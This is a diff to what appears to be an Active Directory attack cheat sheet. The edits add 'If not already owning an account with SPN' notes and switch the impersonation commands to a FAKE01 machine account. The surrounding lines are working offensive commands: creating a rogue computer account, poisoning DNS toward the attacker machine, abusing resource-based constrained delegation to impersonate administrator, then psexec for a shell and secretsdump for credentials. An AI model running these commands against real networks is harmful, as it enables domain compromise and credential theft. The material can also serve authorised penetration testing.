@@ -896,6 +896,7 @@ dir \\<COMPUTER>\C$
 - The blog says this is a requirement but it isn't "On a Domain Controller to have the LDAPS channel binding not required (default value)". You can relay to LDAP and use your own object with a SPN or relay to LDAPS and it will create it. If LDAP or use a specific user use the ```--escalate-user``` flag.
 
 #### Check who can add computers to the domain
+- If not already owning an account with SPN
 ```
 (Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
 
@@ -951,6 +952,7 @@ Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> 
 ```
 
 #### Create a new computer object
+- If not already owning an account with SPN
 - https://github.com/Kevin-Robertson/Powermad
 - https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
 ```
@@ -985,7 +987,7 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 #### Impersonate any user and exploit
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
-getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
+getST.py <DOMAIN>/FAKE01@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
 export KRB5CCNAME=administrator.ccache
 python3 Psexec.py -k -no-pass <TARGET FQDN>
 python3 Secretsdump.py -k <TARGET FQDN>
@@ -1000,6 +1002,7 @@ python3 Secretsdump.py -k <TARGET FQDN>
 - https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/
 
 #### Check who can add computers to the domain
+- If not already owning an account with SPN
 ```
 (Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
 
@@ -1011,6 +1014,7 @@ cme ldap <DC IP> -d <DOMAIN> -u <USER> -p <PASS> -M maq
 #### Create a new computer object
 - https://github.com/Kevin-Robertson/Powermad
 - https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
+- If not already owning an account with SPN
 ```
 import-module powermad
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -1042,7 +1046,7 @@ change-lockscreen -webdav \\webdav@8080\
 
 #### Impersonate any user
 ```
-getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
+getST.py <DOMAIN>/FAKE01@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
 Export KRB5CCNAME=administrator.ccache
 Psexec.py -k -no-pass <TARGET FQDN>
 ```
